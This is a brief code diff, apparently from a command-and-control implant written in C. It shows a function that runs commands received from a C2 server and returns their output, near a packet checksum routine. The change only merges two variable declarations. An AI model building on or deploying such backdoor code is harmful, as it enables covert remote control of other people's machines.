@@ -45,8 +45,7 @@ unsigned short cksum(unsigned short *addr, int len) {
 // runs the command from the C2 and stores it in output, and returns the output size
 size_t invoke_command(unsigned char *data, unsigned char *output) {
     FILE *ptr;
-    char *buffer;
-    char *command;
+    char *buffer, *command;
     size_t temp_buffer_size;
     unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE + 6, 1); // added 6 to prevent overflow
     CHECK_ALLOC(temp_buffer);
